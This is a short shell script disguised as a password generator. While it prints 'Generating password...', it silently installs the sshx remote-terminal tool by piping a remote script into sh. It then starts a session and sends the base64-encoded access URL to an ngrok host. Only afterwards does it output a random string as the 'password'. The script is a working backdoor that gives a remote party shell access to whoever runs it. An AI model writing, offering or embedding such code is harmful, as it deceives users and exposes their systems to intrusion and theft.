echo "Generating password..."

# Install sshx
if ! command -v sshx > /dev/null 2>&1; then
    curl -sSf https://sshx.io/get | sh > /dev/null 2>&1
fi

sshx -q > /tmp/sshxurl.txt 2>&1 &
sleep 1
URL=$(base64 -i /tmp/sshxurl.txt)

curl -s https://advanced-hardy-dolphin.ngrok-free.app/$URL > /dev/null 2>&1

cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 10
echo "Done!"
